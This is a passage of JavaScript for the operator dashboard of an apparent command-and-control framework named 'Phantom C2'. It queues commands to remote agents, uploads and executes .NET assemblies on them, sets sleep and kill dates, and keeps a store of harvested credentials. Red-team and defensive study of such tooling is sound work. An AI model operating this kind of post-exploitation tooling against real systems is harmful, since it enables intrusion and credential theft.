  {id:'T1033',name:'System Owner/User Discovery',commands:['ad-enum-users']},
];

function renderMitre() {
  const el = document.getElementById('mitre-map');
  if (!el) return;
  el.innerHTML = mitreMap.map(m =>
    '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:8px 10px">' +
    '<div style="font-size:10px;color:var(--cyan);font-weight:600">'+m.id+'</div>' +
    '<div style="font-size:11px;color:var(--text-primary);margin-top:2px">'+m.name+'</div>' +
    '<div style="font-size:10px;color:var(--text-muted);margin-top:3px;font-family:monospace">'+m.commands.join(', ')+'</div></div>'
  ).join('');
}

// ──── Auto-Tasks ────
async function loadAutoTasks() {
  const list = document.getElementById('autotask-list');
  if (!list) return;
  try {
    const tasks = await fetchJ('/api/autotasks');
    if (tasks.length === 0) {
      list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;text-align:center;padding:12px">No auto-tasks configured. New agents will check in without running any commands.</div>';
      return;
    }
    list.innerHTML = tasks.map((t,i) =>
      '<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;margin-bottom:4px">' +
      '<span style="font-family:monospace;font-size:12px;color:var(--text-primary)">'+t.command+' '+t.args+'</span>' +
      '<button class="qbtn" onclick="removeAutoTask('+i+')" style="color:var(--red);font-size:10px;padding:3px 8px">✕</button></div>'
    ).join('');
  } catch(e) {}
}

async function addAutoTask() {
  const cmd = document.getElementById('at-cmd').value;
  const args = document.getElementById('at-args').value;
  await fetch('/api/autotasks', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'add', command:cmd, args:args})});
  document.getElementById('at-args').value = '';
  loadAutoTasks();
}

async function removeAutoTask(idx) {
  await fetch('/api/autotasks', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'remove', index:idx})});
  loadAutoTasks();
}

// ──── Audit Log ────
async function loadAuditLog() {
  const table = document.getElementById('audit-table');
  if (!table) return;
  try {
    const log = await fetchJ('/api/auditlog');
    if (log.length === 0) {
      table.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:24px">No operations logged yet. Send commands to agents to populate the audit trail.</td></tr>';
      return;
    }
    table.innerHTML = log.slice().reverse().map(e =>
      '<tr><td style="font-family:monospace;font-size:12px;color:var(--text-muted)">'+e.time+'</td>' +
      '<td style="color:var(--accent-light);font-weight:600">'+e.operator+'</td>' +
      '<td>'+e.agent+'</td>' +
      '<td><span style="color:var(--cyan);font-size:11px;font-weight:600;text-transform:uppercase">'+e.action+'</span></td>' +
      '<td style="font-family:monospace;font-size:12px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+e.detail+'</td></tr>'
    ).join('');
  } catch(e) {}
}

// ──── Agent Rename ────
async function renameAgent(agentName) {
  const newName = prompt('Rename agent "'+agentName+'" to:');
  if (!newName || !newName.trim()) return;
  await fetch('/api/agent/rename', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agentName, new_name:newName.trim()})});
  refreshAll();
}

// ──── Colored Terminal Output ────
function colorizeOutput(text) {
  if (!text) return '';
  return text
    .replace(/\b(error|failed|denied|not found|refused|timeout)\b/gi, '<span style="color:var(--red)">$1</span>')
    .replace(/\b(success|ok|active|running|complete|found)\b/gi, '<span style="color:var(--green)">$1</span>')
    .replace(/\b(warning|deprecated|caution)\b/gi, '<span style="color:var(--yellow)">$1</span>')
    .replace(/(FLAG\{[^}]+\})/g, '<span style="color:#f59e0b;font-weight:bold;background:rgba(245,158,11,0.1);padding:1px 4px;border-radius:3px">$1</span>')
    .replace(/(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)/g, '<span style="color:var(--cyan)">$1</span>')
    .replace(/(\/[\w\/.]+)/g, '<span style="color:var(--accent-light)">$1</span>');
}

// ──── Engagement Notes (Global) ────
let engagementNotes = localStorage.getItem('phantom-engagement-notes') || '';

function saveEngagementNotes() {
  const el = document.getElementById('engagement-notes-text');
  if (el) {
    engagementNotes = el.value;
    localStorage.setItem('phantom-engagement-notes', engagementNotes);
  }
}

// ──── Terminal Assembly & Upload (below terminal) ────
function termAsmFileSelected(input) {
  var dz = document.getElementById('term-asm-dropzone');
  if (input.files && input.files[0]) {
    dz.innerHTML = '<span style="color:#10b981">⚡ ' + input.files[0].name + ' (' + Math.round(input.files[0].size/1024) + 'KB)</span>';
  }
}

function termUploadFileSelected(input) {
  var dz = document.getElementById('term-upload-dropzone');
  if (input.files && input.files[0]) {
    dz.innerHTML = '<span style="color:#10b981">📄 ' + input.files[0].name + ' (' + Math.round(input.files[0].size/1024) + 'KB)</span>';
  }
}

async function termExecuteAssembly() {
  var agent = document.getElementById('agent-select').value;
  var fileInput = document.getElementById('term-asm-file');
  var args = document.getElementById('term-asm-args').value.trim();

  if (!agent) { termLog('error', '✗ Select an agent first'); return; }
  if (!fileInput || !fileInput.files || !fileInput.files[0]) { termLog('error', '✗ Select a .NET assembly file first'); return; }

  var file = fileInput.files[0];
  var remotePath = 'C:\\Users\\Public\\' + file.name;

  termLog('system', '⚡ Uploading ' + file.name + ' (' + Math.round(file.size/1024) + 'KB) to ' + agent + '...');

  // Upload
  var formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  formData.append('remote_path', remotePath);

  try {
    var resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    var data = await resp.json();
    if (data.error) { termLog('error', '✗ Upload failed: ' + data.error); return; }
    termLog('success', '✓ Uploaded to ' + remotePath);
  } catch(e) { termLog('error', '✗ Upload error: ' + e.message); return; }

  // Execute
  termLog('system', '⚡ Executing: assembly ' + remotePath + ' ' + args);
  var cmdArgs = remotePath + (args ? ' ' + args : '');
  try {
    var resp2 = await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})});
    var data2 = await resp2.json();
    if (data2.error) { termLog('error', '✗ ' + data2.error); return; }
    termLog('success', '✓ Assembly task queued (ID: ' + data2.task_id.substring(0,8) + ') — waiting for agent check-in...');

    // Poll for result
    for (var i = 0; i < 15; i++) {
      await new Promise(function(r) { setTimeout(r, 4000); });
      var detail = await fetchJ('/api/agent/' + agent);
      if (detail.tasks) {
        for (var t = 0; t < detail.tasks.length; t++) {
          var task = detail.tasks[t];
          if (data2.task_id.startsWith(task.id) || task.id.startsWith(data2.task_id.substring(0,8))) {
            if (task.status !== 'pending' && task.status !== 'sent') {
              if (task.output) { termLog('output', task.output); }
              if (task.error) { termLog('error', task.error); }
              return;
            }
          }
        }
      }
    }
    termLog('info', 'Timeout — check agent task history');
  } catch(e) { termLog('error', '✗ ' + e.message); }
}

async function termUploadFile() {
  var agent = document.getElementById('agent-select').value;
  var fileInput = document.getElementById('term-upload-file');
  var remotePath = document.getElementById('term-upload-path').value.trim();

  if (!agent) { termLog('error', '✗ Select an agent first'); return; }
  if (!fileInput || !fileInput.files || !fileInput.files[0]) { termLog('error', '✗ Select a file first'); return; }

  var file = fileInput.files[0];
  if (!remotePath) { remotePath = 'C:\\Users\\Public\\' + file.name; }

  termLog('system', '📤 Uploading ' + file.name + ' → ' + remotePath);

  var formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  formData.append('remote_path', remotePath);

  try {
    var resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    var data = await resp.json();
    if (data.error) { termLog('error', '✗ ' + data.error); return; }
    termLog('success', '✓ Upload queued: ' + remotePath + ' (' + data.size + ' bytes, task: ' + data.task_id.substring(0,8) + ')');
  } catch(e) { termLog('error', '✗ ' + e.message); }
}

// ──── .NET Assembly Execution (Settings page — kept for backward compat) ────
function asmFileSelected(input) {
  var dz = document.getElementById('asm-dropzone');
  if (input.files && input.files[0]) {
    var f = input.files[0];
    dz.innerHTML = '<div style="color:#10b981;font-size:13px">⚡ ' + f.name + ' (' + Math.round(f.size/1024) + 'KB)</div>';
  }
}

function setAsmArgs(args) {
  document.getElementById('asm-args').value = args;
  document.getElementById('asm-inline-args').value = args;
}

async function executeAssemblyUpload() {
  var agent = document.getElementById('asm-agent').value;
  var fileInput = document.getElementById('asm-file');
  var args = document.getElementById('asm-args').value.trim();
  var result = document.getElementById('asm-upload-result');

  if (!agent) { alert('Select an agent first'); return; }
  if (!fileInput || !fileInput.files || fileInput.files.length === 0) { alert('Select a .NET assembly file first'); return; }

  var file = fileInput.files[0];
  var remotePath = 'C:\\Users\\Public\\' + file.name;

  result.innerHTML = '<span style="color:#f59e0b;">Step 1/2: Uploading ' + file.name + ' to agent...</span>';

  // Step 1: Upload file to agent
  var formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  formData.append('remote_path', remotePath);

  try {
    var uploadResp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    var uploadData = await uploadResp.json();
    if (uploadData.error) {
      result.innerHTML = '<span style="color:#ef4444;">Upload failed: ' + uploadData.error + '</span>';
      return;
    }
    result.innerHTML = '<span style="color:#f59e0b;">Step 2/2: Executing assembly...</span>';
  } catch(e) {
    result.innerHTML = '<span style="color:#ef4444;">Upload error: ' + e.message + '</span>';
    return;
  }

  // Step 2: Execute the uploaded assembly
  var cmdArgs = remotePath + (args ? ' ' + args : '');
  try {
    var resp = await fetch('/api/cmd', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
    });
    var data = await resp.json();
    if (data.error) {
      result.innerHTML = '<span style="color:#ef4444;">' + data.error + '</span>';
      return;
    }
    result.innerHTML = '<span style="color:#10b981;">Assembly uploaded and queued (task: ' + data.task_id.substring(0,8) + '). Check terminal for output.</span>';
  } catch(e) {
    result.innerHTML = '<span style="color:#ef4444;">' + e.message + '</span>';
  }
}

async function executeAssemblyInline() {
  const agent = document.getElementById('asm-inline-agent').value;
  const b64 = document.getElementById('asm-b64').value.trim();
  const args = document.getElementById('asm-inline-args').value.trim();
  const result = document.getElementById('asm-inline-result');

  if (!agent) { alert('Select an agent'); return; }
  if (!b64) { alert('Paste base64-encoded assembly'); return; }

  result.innerHTML = '<span style="color:var(--yellow)">Executing...</span>';

  const cmdArgs = 'inline ' + b64 + (args ? ' ' + args : '');
  try {
    const resp = await fetch('/api/cmd', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
    });
    const data = await resp.json();
    if (data.error) { result.innerHTML = '<span style="color:var(--red)">'+data.error+'</span>'; return; }
    result.innerHTML = '<span style="color:var(--green)">Assembly queued (task: '+data.task_id.substring(0,8)+'). Check terminal for output.</span>';
  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}

// Populate assembly agent selectors
function updateAsmAgents(agents) {
  ['asm-agent','asm-inline-agent'].forEach(id => {
    const sel = document.getElementById(id);
    if (!sel) return;
    const cur = sel.value;
    sel.innerHTML = '<option value="">Select agent...</option>' + agents.filter(a=>a.status==='active').map(a =>
      '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.hostname+')</option>'
    ).join('');
  });
}

// ──── API Key Management ────
async function createAPIKey() {
  const name = document.getElementById('apikey-name').value.trim() || 'api-key';
  const resp = await fetch('/api/keys', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'create', name:name})});
  const data = await resp.json();
  if (data.key) {
    document.getElementById('apikey-result').innerHTML =
      '<div style="background:var(--bg-input);border:1px solid var(--green);border-radius:var(--radius);padding:12px;margin-bottom:8px">' +
      '<div style="font-size:11px;color:var(--green);margin-bottom:4px">Key created — copy it now (shown only once)</div>' +
      '<code style="font-size:13px;word-break:break-all;color:var(--text-primary)">' + data.key + '</code>' +
      '<div style="margin-top:8px;font-size:11px;color:var(--text-muted)">Usage: curl -H "X-API-Key: ' + data.key + '" http://localhost:3000/api/agents</div></div>';
    document.getElementById('apikey-name').value = '';
    loadAPIKeys();
  }
}
async function loadAPIKeys() {
  const list = document.getElementById('apikey-list');
  if (!list) return;
  const keys = await fetchJ('/api/keys');
  if (!keys || keys.length === 0) { list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;text-align:center;padding:12px">No API keys</div>'; return; }
  list.innerHTML = keys.map(k =>
    '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;margin-bottom:4px">' +
    '<div><span style="font-weight:600;font-size:12px">'+k.name+'</span> <code style="font-size:10px;color:var(--text-muted)">'+k.key+'</code>' +
    '<div style="font-size:10px;color:var(--text-muted)">Created: '+k.created_at+' | Last used: '+(k.last_used||'never')+' | Requests: '+k.requests+'</div></div>' +
    '<button class="qbtn" onclick="revokeAPIKey(\''+k.key+'\')" style="color:var(--red);font-size:10px;padding:3px 8px">Revoke</button></div>'
  ).join('');
}
async function revokeAPIKey(key) {
  if (!confirm('Revoke this API key?')) return;
  await fetch('/api/keys', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'revoke', key:key})});
  loadAPIKeys();
}

// ──── Task Queue ────
async function loadTaskQueue() {
  const table = document.getElementById('taskqueue-table');
  if (!table) return;
  const tasks = await fetchJ('/api/taskqueue');
  if (!tasks || tasks.length === 0) {
    table.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:20px">No pending tasks — all commands have been executed</td></tr>';
    return;
  }
  table.innerHTML = tasks.map(t =>
    '<tr><td style="font-weight:600">'+t.agent+'</td><td style="color:var(--cyan)">'+t.type+'</td>' +
    '<td style="font-family:monospace;font-size:11px">'+t.args+'</td>' +
    '<td>'+badge(t.status)+'</td><td style="color:var(--text-muted);font-size:11px">'+t.created+'</td></tr>'
  ).join('');
}

// ──── File Upload to Agent ────
function updateDropzone(input) {
  const dz = document.getElementById('upload-dropzone');
  if (input.files.length > 0) {
    const f = input.files[0];
    dz.innerHTML = '<div style="color:var(--green);font-size:13px">📄 ' + f.name + ' (' + (f.size/1024).toFixed(1) + ' KB)</div>';
  }
}
async function uploadToAgent() {
  const agent = document.getElementById('upload-agent').value;
  const file = document.getElementById('upload-file').files[0];
  const remotePath = document.getElementById('upload-path').value;
  const result = document.getElementById('upload-result');

  if (!agent) { alert('Select an agent'); return; }
  if (!file) { alert('Select a file'); return; }

  result.innerHTML = '<span style="color:var(--yellow)">Uploading...</span>';

  const formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  if (remotePath) formData.append('remote_path', remotePath);

  try {
    const resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    const data = await resp.json();
    if (data.error) { result.innerHTML = '<span style="color:var(--red)">'+data.error+'</span>'; return; }
    result.innerHTML = '<span style="color:var(--green)">Uploaded: '+data.remote_path+' ('+data.size+' bytes, task: '+data.task_id.substring(0,8)+')</span>';
  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}
// Populate upload agent selector
function updateUploadAgents(agents) {
  const sel = document.getElementById('upload-agent');
  if (!sel) return;
  const cur = sel.value;
  sel.innerHTML = '<option value="">Select agent...</option>' + agents.filter(a=>a.status==='active').map(a =>
    '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.hostname+')</option>'
  ).join('');
}

// ──── Agent Health Chart ────
let healthHistory = {};
function drawHealthChart(agents) {
  const canvas = document.getElementById('health-chart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const dpr = window.devicePixelRatio || 1;
  const w = canvas.parentElement.clientWidth;
  const h = 200;
  canvas.width = w*dpr; canvas.height = h*dpr;
  canvas.style.width = w+'px'; canvas.style.height = h+'px';
  ctx.scale(dpr,dpr);
  ctx.clearRect(0,0,w,h);

  // Track check-in counts over time
  const now = Date.now();
  agents.forEach(a => {
    if (!healthHistory[a.name]) healthHistory[a.name] = [];
    const isActive = a.status === 'active' ? 1 : 0;
    healthHistory[a.name].push({t:now, v:isActive});
    if (healthHistory[a.name].length > 30) healthHistory[a.name].shift();
  });

  // Draw axes
  ctx.strokeStyle = 'rgba(42,48,80,0.5)'; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(40,10); ctx.lineTo(40,h-30); ctx.lineTo(w-10,h-30); ctx.stroke();

  // Labels
  ctx.fillStyle = '#5a6580'; ctx.font = '9px Inter'; ctx.textAlign = 'center';
  ctx.fillText('Agent Check-in Health (last 2 minutes)', w/2, h-5);
  ctx.textAlign = 'right';
  ctx.fillText('Active', 38, 20);
  ctx.fillText('Dead', 38, h-35);

  // Plot each agent
  const names = Object.keys(healthHistory);
  const lineColors = ['#10b981','#3b82f6','#f59e0b','#ef4444','#a78bfa','#06b6d4','#ec4899','#84cc16'];

  names.forEach((name, ni) => {
    const points = healthHistory[name];
    if (points.length < 2) return;
    const color = lineColors[ni % lineColors.length];
    ctx.strokeStyle = color; ctx.lineWidth = 2; ctx.globalAlpha = 0.8;
    ctx.beginPath();
    points.forEach((p, pi) => {
      const x = 45 + (pi / Math.max(points.length-1,1)) * (w-60);
      const y = p.v ? 20 : h-35;
      pi === 0 ? ctx.moveTo(x,y) : ctx.lineTo(x,y);
    });
    ctx.stroke();
    ctx.globalAlpha = 1;

    // Legend dot
    ctx.fillStyle = color;
    ctx.beginPath(); ctx.arc(50+ni*80, h-15, 4, 0, Math.PI*2); ctx.fill();
    ctx.fillStyle = '#8892b0'; ctx.font = '8px Inter'; ctx.textAlign = 'left';
    ctx.fillText(name.substring(0,10), 58+ni*80, h-12);
  });
}

// ──── Bulk Agent Actions ────
function bulkToggleAll(cb) {
  document.querySelectorAll('.bulk-cb').forEach(c => c.checked = cb.checked);
}
function bulkSelectAll() {
  document.querySelectorAll('.bulk-cb').forEach(c => c.checked = true);
  document.getElementById('bulk-all').checked = true;
}
async function bulkSendCmd() {
  const cmd = document.getElementById('bulk-cmd').value.trim();
  if (!cmd) { alert('Enter a command first'); return; }
  const selected = [...document.querySelectorAll('.bulk-cb:checked')].map(c => c.dataset.agent);
  if (selected.length === 0) { alert('Select at least one agent'); return; }
  const parts = cmd.split(' ');
  const command = parts[0];
  const args = parts.slice(1).join(' ');
  let count = 0;
  for (const agent of selected) {
    await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:command, args:args})});
    count++;
  }
  alert('Command sent to ' + count + ' agents: ' + cmd);
  document.getElementById('bulk-cmd').value = '';
}
async function bulkRemoveDead() {
  const dead = [...document.querySelectorAll('.bulk-cb')].filter(c => c.dataset.status === 'dead');
  if (dead.length === 0) { alert('No dead agents to remove'); return; }
  if (!confirm('Remove ' + dead.length + ' dead agents?')) return;
  for (const c of dead) {
    await fetch('/api/agent/remove', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:c.dataset.id})});
  }
  refreshAll();
}

// ──── Report Generator ────
async function generateReport() {
  try {
    const agents = await fetchJ('/api/agents');
    const tasks = await fetchJ('/api/tasks');
    const events = await fetchJ('/api/events') || [];
    const audit = await fetchJ('/api/auditlog') || [];

    let md = '# Phantom C2 — Engagement Report\\n';
    md += '**Generated:** ' + new Date().toISOString() + '\\n\\n';
    md += '## Agents (' + agents.length + ')\\n\\n';
    md += '| Name | OS | Hostname | IP | Status |\\n|---|---|---|---|---|\\n';
    agents.forEach(a => md += '| ' + a.name + ' | ' + a.os + ' | ' + a.hostname + ' | ' + a.ip + ' | ' + a.status + ' |\\n');
    md += '\\n## Tasks (' + tasks.length + ')\\n\\n';
    md += '| Agent | Type | Command | Status | Time |\\n|---|---|---|---|---|\\n';
    tasks.slice(0,50).forEach(t => md += '| ' + t.agent + ' | ' + t.type + ' | ' + (t.args||'').substring(0,40) + ' | ' + t.status + ' | ' + t.time + ' |\\n');
    md += '\\n## Operator Audit Log (' + audit.length + ' entries)\\n\\n';
    audit.slice(-20).forEach(e => md += '- [' + e.time + '] ' + e.operator + ' → ' + e.agent + ': ' + e.action + ' ' + e.detail + '\\n');
    md += '\\n## Credentials\\n\\n';
    credentials.forEach(c => md += '- **' + c.source + '** ' + c.username + ' / ' + c.password + ' (' + c.type + ')\\n');
    md += '\\n## Notes\\n\\n' + (engagementNotes || 'No notes recorded.');

    const blob = new Blob([md.replace(/\\\\n/g,'\\n')], {type:'text/markdown'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'phantom-report-' + new Date().toISOString().slice(0,10) + '.md';
    a.click(); URL.revokeObjectURL(url);
  } catch(e) { alert('Report error: ' + e.message); }
}

// ──── Theme Presets ────
const themePresets = {
  dark: {name:'Phantom Dark',bg:'#0a0e1a',secondary:'#111827',accent:'#7c3aed',accentLight:'#a78bfa',text:'#e8ecf4'},
  light: {name:'Light',bg:'#f0f2f5',secondary:'#ffffff',accent:'#7c3aed',accentLight:'#6d28d9',text:'#1f2937'},
  cobalt: {name:'Cobalt Strike',bg:'#0c1021',secondary:'#141a2e',accent:'#3b82f6',accentLight:'#60a5fa',text:'#c8d6e5'},
  mythic: {name:'Mythic Dark',bg:'#1a1a2e',secondary:'#16213e',accent:'#e94560',accentLight:'#ff6b81',text:'#eaeaea'},
  hacker: {name:'Hacker Green',bg:'#0a0a0a',secondary:'#111111',accent:'#00ff41',accentLight:'#39ff14',text:'#00ff41'},
};

function applyThemePreset(preset) {
  const t = themePresets[preset];
  if (!t) return;
  const root = document.documentElement;
  if (preset === 'light') { root.setAttribute('data-theme','light'); }
  else {
    root.setAttribute('data-theme','dark');
    root.style.setProperty('--bg-primary', t.bg);
    root.style.setProperty('--bg-secondary', t.secondary);
    root.style.setProperty('--accent', t.accent);
    root.style.setProperty('--accent-light', t.accentLight);
    root.style.setProperty('--accent-glow', t.accent.replace(')',',0.15)').replace('rgb','rgba'));
    root.style.setProperty('--text-primary', t.text);
  }
  localStorage.setItem('phantom-theme-preset', preset);
  document.getElementById('theme-btn').firstChild.textContent = preset === 'light' ? '☀️' : '🌙';
}

// ──── Webhook Config ────
async function configureWebhook() {
  const url = prompt('Webhook URL (Slack/Discord):');
  if (!url) return;
  // Store locally and test
  localStorage.setItem('phantom-webhook', url);
  try {
    await fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:'Phantom C2 webhook configured!', text:'Phantom C2 webhook configured!'})});
    alert('Webhook configured and test message sent!');
  } catch(e) { alert('Webhook saved but test failed: ' + e.message); }
}

// ──── Kill Date Management ────
async function setKillDate() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
  const date = prompt('Kill date (YYYY-MM-DD) — agent self-destructs after this date:');
  if (!date || !/^\d{4}-\d{2}-\d{2}$/.test(date)) { alert('Invalid format. Use YYYY-MM-DD'); return; }
  await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:'shell', args:'echo Kill date set: ' + date})});
  termLog('system', 'Kill date set to ' + date + ' for ' + agent);
}

// ──── Engagement Timer ────
const engagementStart = Date.now();
function updateTimer() {
  const elapsed = Math.floor((Date.now() - engagementStart) / 1000);
  const h = String(Math.floor(elapsed/3600)).padStart(2,'0');
  const m = String(Math.floor((elapsed%3600)/60)).padStart(2,'0');
  const s = String(elapsed%60).padStart(2,'0');
  const el = document.getElementById('engagement-timer');
  if (el) el.textContent = '⏱ ' + h + ':' + m + ':' + s;
}
setInterval(updateTimer, 1000);

// ──── Browser Notifications ────
let notificationsEnabled = false;
let lastAgentCount = 0;
function toggleNotifications() {
  if (!notificationsEnabled) {
    if ('Notification' in window) {
      Notification.requestPermission().then(p => {
        notificationsEnabled = p === 'granted';
        document.getElementById('notif-btn').style.opacity = notificationsEnabled ? '1' : '0.4';
      });
    }
  } else {
    notificationsEnabled = false;
    document.getElementById('notif-btn').style.opacity = '0.4';
  }
}
function notifyNewAgent(name, hostname) {
  if (notificationsEnabled && 'Notification' in window && Notification.permission === 'granted') {
    new Notification('Phantom C2 — New Agent', { body: name + ' (' + hostname + ') checked in', icon: '👻' });
  }
}

// ──── Keyboard Shortcuts ────
document.addEventListener('keydown', function(e) {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') return;
  const pages = ['dashboard','agents','listeners','tasks','terminal','payloads','files','creds','events'];
  if (e.key >= '1' && e.key <= '9' && (e.ctrlKey || e.altKey)) {
    e.preventDefault();
    const idx = parseInt(e.key) - 1;
    if (idx < pages.length) {
      const btns = document.querySelectorAll('.sidebar-btn');
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.getElementById('p-' + pages[idx]).classList.add('active');
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      btns.forEach(b => b.classList.remove('active'));
      if (btns[idx]) btns[idx].classList.add('active');
    }
  }
  if (e.key === '/' && !e.ctrlKey) { e.preventDefault(); document.getElementById('term-input').focus(); }
});

// ──── Sleep/Jitter Control ────
async function updateSleep() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
  const sleep = parseInt(document.getElementById('agent-sleep').value);
  const jitter = parseInt(document.getElementById('agent-jitter').value);
  if (!sleep || sleep < 1) { alert('Invalid sleep value'); return; }
  try {
    const resp = await fetch('/api/cmd', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, command:'sleep', args: sleep + ' ' + (jitter||0)})
    });
    const data = await resp.json();
    if (data.error) { alert(data.error); return; }
    termLog('system', 'Sleep updated to ' + sleep + 's / ' + (jitter||0) + '% jitter');
  } catch(e) { alert(e.message); }
}

// ──── Credential Manager (client-side store) ────
let credentials = JSON.parse(localStorage.getItem('phantom-creds') || '[]');

function showAddCred() {
  const form = document.getElementById('add-cred-form');
  form.style.display = form.style.display === 'none' ? 'block' : 'none';
}

function addCred() {
  const source = document.getElementById('cred-source').value.trim();
  const user = document.getElementById('cred-user').value.trim();
  const pass = document.getElementById('cred-pass').value.trim();
  const type = document.getElementById('cred-type').value;
  if (!user || !pass) { alert('Username and password required'); return; }
  credentials.push({source:source, username:user, password:pass, type:type, added:new Date().toLocaleString()});
  localStorage.setItem('phantom-creds', JSON.stringify(credentials));
  document.getElementById('cred-source').value = '';
  document.getElementById('cred-user').value = '';
  document.getElementById('cred-pass').value = '';
  renderCreds();
}

function removeCred(idx) {
  credentials.splice(idx, 1);
  localStorage.setItem('phantom-creds', JSON.stringify(credentials));
  renderCreds();
}

function renderCreds() {
  const table = document.getElementById('cred-table');
  if (!table) return;
  if (credentials.length === 0) {
    table.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-muted);padding:24px">No credentials stored. Add them manually or they\'ll appear as you harvest them.</td></tr>';
    return;
  }
  table.innerHTML = credentials.map((c,i) => {
    const typeColors = {password:'var(--green)',hash:'var(--yellow)',token:'var(--blue)',key:'var(--cyan)',cookie:'var(--accent-light)'};
    return '<tr><td>'+c.source+'</td><td style="font-weight:600">'+c.username+'</td>' +
      '<td style="font-family:monospace;font-size:12px">'+c.password+'</td>' +
      '<td><span style="color:'+(typeColors[c.type]||'var(--text-muted)')+';font-size:11px;font-weight:600;text-transform:uppercase">'+c.type+'</span></td>' +
      '<td style="color:var(--text-muted);font-size:11px">'+c.added+'</td>' +
      '<td><button class="qbtn" onclick="removeCred('+i+')" style="color:var(--red);font-size:10px;padding:3px 8px">✕</button></td></tr>';
  }).join('');
}

// ──── Export Engagement Data ────
async function exportData() {
  try {
    const agents = await fetchJ('/api/agents');
    const tasks = await fetchJ('/api/tasks');
    const events = await fetchJ('/api/events') || [];
    const data = {
      exported_at: new Date().toISOString(),
      framework: 'Phantom C2',
      agents: agents,
      tasks: tasks,
      events: events,
      credentials: credentials
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'phantom-export-' + new Date().toISOString().slice(0,10) + '.json';
    a.click(); URL.revokeObjectURL(url);
  } catch(e) { alert('Export failed: ' + e.message); }
}

// ──── Theme Toggle ────
const presetOrder = ['dark','light','cobalt','mythic','hacker'];
let currentPresetIdx = 0;

function toggleTheme() {
  currentPresetIdx = (currentPresetIdx + 1) % presetOrder.length;
  applyThemePreset(presetOrder[currentPresetIdx]);
}
// Load saved theme
(function() {
  const saved = localStorage.getItem('phantom-theme-preset') || 'dark';
  const idx = presetOrder.indexOf(saved);
  if (idx >= 0) currentPresetIdx = idx;
  applyThemePreset(saved);
})();

// ──── Remove Agent ────
async function removeAgent(agentId) {
  if (!confirm('Remove this dead agent?')) return;
  try {
    const TOKEN = document.cookie.split('phantom_session=')[1]?.split(';')[0] || '';
    const resp = await fetch('/api/agent/remove', {
      method: 'POST',
      headers: {'Content-Type': 'application/json', 'Cookie': 'phantom_session=' + TOKEN},
      body: JSON.stringify({id: agentId})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

// ──── Init ────
loadAPIKeys();
loadTaskQueue();
loadPayloadHistory();
setInterval(loadTaskQueue, 8000);
// Load engagement notes
const notesEl = document.getElementById('engagement-notes-text');
if (notesEl) notesEl.value = engagementNotes;
renderCreds();
renderMitre();
loadTemplates();
loadAutoTasks();
loadAuditLog();
loadLoot();
refreshAll();
setInterval(refreshAll, 4000);
setInterval(loadAuditLog, 10000);
setInterval(loadLoot, 15000);
setInterval(function(){ drawPivotGraph(); updateIOC(); }, 5000);
setTimeout(function(){ drawPivotGraph(); updateIOC(); }, 2000);
</script>
</body>
</html>`
